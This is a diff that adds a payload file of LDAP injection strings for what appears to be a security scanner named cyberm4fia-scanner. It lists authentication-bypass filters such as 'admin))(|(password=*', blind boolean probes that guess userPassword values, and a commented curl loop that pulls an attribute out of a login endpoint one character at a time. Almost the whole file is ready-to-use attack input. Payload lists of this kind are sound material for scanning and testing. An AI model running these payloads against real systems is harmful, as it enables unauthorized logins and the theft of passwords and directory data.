@@ -1,0 +1,25 @@
+# LDAP Injection Payloads — cyberm4fia-scanner
+# Categories: Auth Bypass, Blind Boolean, Extraction
+
+# ─── Auth Bypass ───
+*
+*)(&
+*))(|(cn=*
+*)(uid=*))(|(uid=*
+admin)(&))
+admin))(|(password=*
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+*)(|(objectClass=*
+
+# ─── Blind Boolean Probes ───
+user*)(userPassword=a*
+user*)(userPassword=b*
+user*)(userPassword=admin*
+admin*)(description=admin*
+
+# ─── Character-by-character Extraction ───
+# for c in {a..z} {0..9}; do
+#   r=$(curl -s "https://t/login?u=admin*)(description=${c}*&p=x")
+# done
